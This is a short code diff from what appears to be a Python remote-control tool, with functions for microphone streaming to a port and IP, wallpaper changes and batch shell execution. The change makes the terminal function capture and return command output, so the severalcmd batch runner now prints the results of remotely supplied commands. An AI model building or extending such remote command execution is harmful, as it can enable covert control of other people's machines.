@@ -112,7 +112,7 @@ def microphone(port, ip):
 
 # esential function
 def terminal(command):
-    subprocess.Popen(command, shell=True)
+    return subprocess.Popen(command, shell=True,stdout=subprocess.PIPE).stdout.read().decode('ascii', "ignore")
 
 def wallpaper(data):
     importImg(data)
@@ -121,8 +121,7 @@ def wallpaper(data):
 def severalcmd(data, temp=0.05):
     datalist = data.split("8!8")
     for i in datalist:
-        print(i)
-        terminal(i)
+        print(terminal(i))
         time.sleep(temp)
 
 def stopall():
